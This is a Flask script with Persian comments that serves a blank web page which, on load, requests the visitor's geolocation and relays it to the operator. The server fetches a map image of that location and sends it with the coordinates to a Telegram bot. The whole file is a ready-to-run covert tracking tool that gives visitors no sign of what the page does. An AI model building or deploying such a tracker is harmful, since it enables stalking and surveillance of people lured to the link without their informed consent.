from flask import Flask, render_template_string, request, jsonify
import requests
import base64

app = Flask(__name__)

# توکن ربات تلگرام و Chat ID
TELEGRAM_BOT_TOKEN = 'bottoken'
TELEGRAM_CHAT_ID = 'chatid'

def send_to_telegram(message, image_data=None):
    if image_data:
        # ارسال تصویر به تلگرام
        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto'
        files = {'photo': ('map.png', image_data, 'image/png')}
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'caption': message
        }
        response = requests.post(url, data=payload, files=files)
    else:
        # ارسال پیام متنی به تلگرام
        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message
        }
        response = requests.post(url, data=payload)
    return response.json()

@app.route('/')
def index():
    # صفحه خالی بدون هیچ محتوایی
    return render_template_string('''
        <!DOCTYPE html>
        <html lang="fa">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>صفحه خالی</title>
            <script>
                // دریافت موقعیت کاربر
                function getLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(sendPositionToServer, showError);
                    } else {
                        console.error("مرورگر شما از دریافت لوکیشن پشتیبانی نمی‌کند.");
                    }
                }

                // ارسال موقعیت به سرور
                function sendPositionToServer(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;

                    fetch('/send_location', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ 
                            latitude: lat, 
                            longitude: lon
                        }),
                    });
                }

                // نمایش خطا
                function showError(error) {
                    console.error("خطا در دریافت موقعیت:", error.message);
                }

                // شروع عملیات پس از بارگذاری صفحه
                window.onload = getLocation;
            </script>
        </head>
        <body>
            <!-- صفحه خالی -->
        </body>
        </html>
    ''')

@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.json
    latitude = data['latitude']
    longitude = data['longitude']

    # ایجاد URL تصویر نقشه با استفاده از OpenStreetMap Static Maps
    static_map_url = f"https://static-maps.yandex.ru/1.x/?ll={longitude},{latitude}&z=15&size=600,400&l=map&pt={longitude},{latitude},pm2rdl"

    # دریافت تصویر نقشه
    try:
        response = requests.get(static_map_url)
        if response.status_code != 200:
            return jsonify({"status": "error", "message": "تصویر نقشه در دسترس نیست."})
        image_data = response.content
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

    # ارسال پیام و تصویر به تلگرام
    message = f"موقعیت جدید دریافت شد:\nعرض جغرافیایی: {latitude}\nطول جغرافیایی: {longitude}"
    telegram_response = send_to_telegram(message, image_data)

    # بررسی پاسخ تلگرام
    if not telegram_response.get("ok"):
        return jsonify({"status": "error", "message": "خطا در ارسال به تلگرام", "telegram_response": telegram_response})

    return jsonify({"status": "success", "message": "Location and image sent to Telegram!"})

if __name__ == '__main__':
    app.run(debug=True)